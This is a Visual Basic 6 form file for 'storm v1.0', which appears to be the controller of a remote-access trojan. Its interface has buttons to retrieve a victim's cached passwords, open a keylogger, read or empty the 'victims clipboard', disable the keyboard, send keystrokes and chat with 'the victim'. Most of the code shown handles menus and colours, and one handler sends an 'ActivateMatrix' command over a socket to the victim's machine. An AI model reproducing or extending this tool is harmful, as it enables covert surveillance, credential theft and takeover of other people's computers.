      Begin VB.PictureBox Picture36 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2040
         ScaleHeight     =   315
         ScaleWidth      =   1545
         TabIndex        =   81
         Top             =   3120
         Width           =   1545
         Begin VB.Shape Shape29 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1515
         End
         Begin VB.Label lblsetclip 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "set clipboard text"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   82
            Top             =   45
            Width           =   1455
         End
      End
      Begin VB.PictureBox Picture18 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   360
         ScaleHeight     =   315
         ScaleWidth      =   3465
         TabIndex        =   79
         Top             =   3720
         Width           =   3465
         Begin VB.Label lblemptyclip 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "empty victims clipboard"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   40
            TabIndex        =   80
            Top             =   45
            Width           =   3135
         End
         Begin VB.Shape Shape28 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   3195
         End
      End
      Begin VB.Label Label21 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "clipboard text"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   86
         Top             =   0
         Width           =   1125
      End
      Begin VB.Line Line4 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   240
         Y2              =   240
      End
   End
   Begin VB.PictureBox picdesktop 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4455
      Left            =   1680
      ScaleHeight     =   4425
      ScaleWidth      =   3705
      TabIndex        =   87
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox picfullscreen 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   840
         ScaleHeight     =   315
         ScaleWidth      =   1935
         TabIndex        =   90
         Top             =   1560
         Width           =   1935
         Begin VB.Label lblfullscreen 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "full screen preview"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   91
            Top             =   45
            Width           =   1800
         End
         Begin VB.Shape Shape32 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1875
         End
      End
      Begin VB.PictureBox picopenscreen 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   840
         ScaleHeight     =   315
         ScaleWidth      =   1905
         TabIndex        =   88
         Top             =   720
         Width           =   1905
         Begin VB.Shape Shape31 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1875
         End
         Begin VB.Label lblopenscreen 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "open screen preview"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   89
            Top             =   45
            Width           =   1815
         End
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "desktop options"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   92
         Top             =   0
         Width           =   1365
      End
      Begin VB.Line Line5 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   240
         Y2              =   240
      End
   End
   Begin VB.PictureBox picpassword 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   71
      Top             =   720
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox Picture26 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   75
         Top             =   3360
         Width           =   1695
         Begin VB.Shape Shape18 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
         Begin VB.Label lblretrievepass 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "retrieve passwords"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   76
            Top             =   45
            Width           =   1605
         End
      End
      Begin VB.TextBox txtpass 
         BackColor       =   &H00800000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   2535
         Left            =   480
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   74
         Top             =   600
         Width           =   2775
      End
      Begin VB.PictureBox Picture25 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1920
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   72
         Top             =   3360
         Width           =   1695
         Begin VB.Label lblsavepass 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "save passwords"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   73
            Top             =   45
            Width           =   1605
         End
         Begin VB.Shape Shape12 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
      End
      Begin VB.Label Label14 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "cached passwords"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   77
         Top             =   240
         Width           =   1605
      End
      Begin VB.Line Line3 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   3555
         Y1              =   480
         Y2              =   480
      End
   End
   Begin VB.PictureBox picchat 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1560
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   61
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox Picture15 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   960
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   64
         Top             =   1200
         Width           =   1695
         Begin VB.Shape Shape13 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
         Begin VB.Label lblvictimchat 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "chat with the victim"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   65
            Top             =   45
            Width           =   1605
         End
      End
      Begin VB.TextBox txtnick 
         BackColor       =   &H00FF8080&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   260
         HideSelection   =   0   'False
         Left            =   1810
         TabIndex        =   62
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "nickname for chat:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Left            =   120
         TabIndex        =   63
         Top             =   480
         Width           =   1605
      End
   End
   Begin VB.PictureBox pickeyboard 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   4335
      Left            =   1680
      ScaleHeight     =   4305
      ScaleWidth      =   3705
      TabIndex        =   54
      Top             =   840
      Visible         =   0   'False
      Width           =   3735
      Begin VB.PictureBox Picture14 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   59
         Top             =   2520
         Width           =   1695
         Begin VB.Label lbldisable 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "disable keyboard"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   60
            Top             =   45
            Width           =   1605
         End
         Begin VB.Shape Shape11 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
      End
      Begin VB.PictureBox Picture13 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   57
         Top             =   960
         Width           =   1695
         Begin VB.Label lblsendkeys 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "send keys"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   58
            Top             =   45
            Width           =   1605
         End
         Begin VB.Shape Shape10 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
      End
      Begin VB.PictureBox Picture11 
         BackColor       =   &H00000000&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1080
         ScaleHeight     =   315
         ScaleWidth      =   1695
         TabIndex        =   55
         Top             =   360
         Width           =   1695
         Begin VB.Shape Shape9 
            BorderColor     =   &H00FF8080&
            Height          =   285
            Left            =   15
            Top             =   15
            Width           =   1665
         End
         Begin VB.Label lbllogger 
            Alignment       =   2  'Center
            BackColor       =   &H00000000&
            Caption         =   "open keylogger"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   225
            Left            =   45
            TabIndex        =   56
            Top             =   45
            Width           =   1605
         End
      End
   End
   Begin VB.Label lblPort 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "port:"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   2760
      TabIndex        =   7
      Top             =   360
      Width           =   375
   End
   Begin VB.Label lblIp 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "ip/uin:"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   315
      Left            =   600
      TabIndex        =   6
      Top             =   360
      Width           =   495
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      ForeColor       =   &H00FFFFFF&
      Height          =   465
      Left            =   0
      TabIndex        =   3
      Top             =   240
      Width           =   5535
   End
   Begin VB.Label Status 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   1200
      TabIndex        =   2
      Top             =   5520
      Width           =   4335
   End
   Begin VB.Label cmdX 
      Alignment       =   2  'Center
      BackColor       =   &H00FF8080&
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "OCR A Extended"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   5280
      TabIndex        =   1
      ToolTipText     =   "Close"
      Top             =   15
      Width           =   240
   End
   Begin VB.Label title 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "storm v1.0"
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5535
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim FirstX, FirstY As Integer
Public mGradient As New clsGradient

Sub DrawGrad()
    With mGradient
        .Angle = 0
        .Color1 = &H8
        .Color2 = &HFF8080
        .Draw Picright
    End With
    Picright.Refresh
    
    With mGradient
        .Angle = 180
        .Color1 = &H8
        .Color2 = &HFF8080
        .Draw picleft
    End With
    picleft.Refresh
End Sub

Private Sub Form_Load()
DrawGrad
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub cmdConnect_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Picture7.Height = 320
Picture8.Height = 320
Picture9.Height = 320
Picture10.Height = 320
Picture6.Height = 2000
Picture7.Top = Picture6.Top + Picture6.Height + 40
Picture8.Top = Picture7.Top + Picture7.Height + 40
Picture9.Top = Picture8.Top + Picture8.Height + 40
Picture10.Top = Picture9.Top + Picture9.Height + 40
End Sub

Private Sub cmdFun_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdFun.BackColor = &HFFC0C0
End Sub

Private Sub cmdFun_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdFun.BackColor = &HFF8080
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdXtra.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
lblmsg.BackColor = &H8
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblkeyboard.BackColor = &H8
lblclipmngr.BackColor = &H8
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
lbldesktop.BackColor = &H8
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
lblscreensave.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
End Sub

Private Sub cmdFun_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Picture6.Height = 320
Picture7.Height = 320
Picture8.Height = 320
Picture10.Height = 320
Picture9.Height = 2000
Picture7.Top = Picture6.Top + Picture6.Height + 40
Picture8.Top = Picture7.Top + Picture7.Height + 40
Picture9.Top = Picture8.Top + Picture8.Height + 40
Picture10.Top = Picture9.Top + Picture9.Height + 40
End Sub

Private Sub cmdKey_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdKey.BackColor = &HFFC0C0
End Sub

Private Sub cmdKey_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdKey.BackColor = &HFF8080
cmdConnect.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
lblmsg.BackColor = &H8
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblkeyboard.BackColor = &H8
lblclipmngr.BackColor = &H8
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
lbldesktop.BackColor = &H8
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
lblscreensave.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
End Sub

Private Sub cmdKey_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Picture6.Height = 320
Picture8.Height = 320
Picture9.Height = 320
Picture10.Height = 320
Picture7.Height = 2000
Picture7.Top = Picture6.Top + Picture6.Height + 40
Picture8.Top = Picture7.Top + Picture7.Height + 40
Picture9.Top = Picture8.Top + Picture8.Height + 40
Picture10.Top = Picture9.Top + Picture9.Height + 40
End Sub

Private Sub cmdMisc_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdMisc.BackColor = &HFFC0C0
End Sub

Private Sub cmdMisc_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdMisc.BackColor = &HFF8080
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
lblmsg.BackColor = &H8
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblkeyboard.BackColor = &H8
lblclipmngr.BackColor = &H8
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
lbldesktop.BackColor = &H8
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
lblscreensave.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
End Sub

Private Sub cmdMisc_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Picture6.Height = 320
Picture7.Height = 320
Picture9.Height = 320
Picture10.Height = 320
Picture8.Height = 2000
Picture7.Top = Picture6.Top + Picture6.Height + 40
Picture8.Top = Picture7.Top + Picture7.Height + 40
Picture9.Top = Picture8.Top + Picture8.Height + 40
Picture10.Top = Picture9.Top + Picture9.Height + 40
End Sub

Private Sub cmdX_Click()
Unload Me
End Sub

Private Sub cmdX_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdX.ForeColor = &HC00000
End Sub

Private Sub cmdXtra_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdXtra.BackColor = &HFFC0C0
End Sub

Private Sub cmdXtra_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdXtra.BackColor = &HFF8080
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
lblmsg.BackColor = &H8
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblkeyboard.BackColor = &H8
lblclipmngr.BackColor = &H8
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
lbldesktop.BackColor = &H8
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lblbrowser.BackColor = &H8
lblwincolour.BackColor = &H8
lblscreensave.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub cmdXtra_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Picture6.Height = 320
Picture7.Height = 320
Picture8.Height = 320
Picture9.Height = 320
Picture10.Height = 2000
Picture7.Top = Picture6.Top + Picture6.Height + 40
Picture8.Top = Picture7.Top + Picture7.Height + 40
Picture9.Top = Picture8.Top + Picture8.Height + 40
Picture10.Top = Picture9.Top + Picture9.Height + 40
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
cmdX.BackColor = &HFF8080
lblretrievepass.BackColor = &H8
lblsavepass.BackColor = &H8
lblreadclip.BackColor = &H8
lblsetclip.BackColor = &H8
lblemptyclip.BackColor = &H8
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
cmdX.BackColor = &HFF8080
End Sub

Private Sub Label23_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
txturl.BackColor = &HFF8080
End Sub

Private Sub lblactivate_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If WS.State = 0 Then
Status.Caption = "you're not connected!..."
Else
tmrright.Enabled = True
WS.SendData "ActivateMatrix"
Status.Caption = "activating the matrix..."
End If
End Sub

Private Sub lblbad_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optiondark.Visible = False
optionbright.Visible = False
optionbad.Visible = True
End Sub

Private Sub lblbold_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblbold.BackColor = &H800000 Then
lblbold.BackColor = &H8
Else: lblbold.BackColor = &H800000
End If
If lblbold.BackColor = &H800000 Then
txtprint.FontBold = True
Else: txtprint.FontBold = False
End If
End Sub

Private Sub lblbright_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
optionnormal.Visible = False
optioninvert.Visible = False
optionbad.Visible = False
optiondark.Visible = False
optionbright.Visible = True
End Sub

Private Sub lblbrowser_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblbrowser.BackColor = &HFFC0C0
End Sub

Private Sub lblbrowser_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblbrowser.BackColor = &H800000
lblflip.BackColor = &H8
lblprint.BackColor = &H8
lbldesktop.BackColor = &H8
lblwincolour.BackColor = &H8
End Sub

Private Sub lblbrowser_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picbrowser.Visible = True
End Sub

Private Sub lblChat_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblchat.BackColor = &HFFC0C0
End Sub

Private Sub lblChat_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblchat.BackColor = &H800000
lblkeyboard.BackColor = &H8
lblmatrix.BackColor = &H8
lblmsg.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblchat_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picserver.Visible = False
pickeyboard.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
picclipboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picchat.Visible = True
End Sub

Private Sub lblclipmngr_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclipmngr.BackColor = &HFFC0C0
End Sub

Private Sub lblclipmngr_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclipmngr.BackColor = &H800000
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub lblclipmngr_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtwelcome.Visible = False
picserver.Visible = False
picinfo.Visible = False
picnotify.Visible = False
picchat.Visible = False
picmatrix.Visible = False
picpassword.Visible = False
pickeyboard.Visible = False
picdesktop.Visible = False
picflipscreen.Visible = False
picbrowser.Visible = False
picprint.Visible = False
picshutdown.Visible = False
pictime.Visible = False
picclipboard.Visible = True
End Sub

Private Sub lblClose_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclose.BackColor = &H800000
End Sub

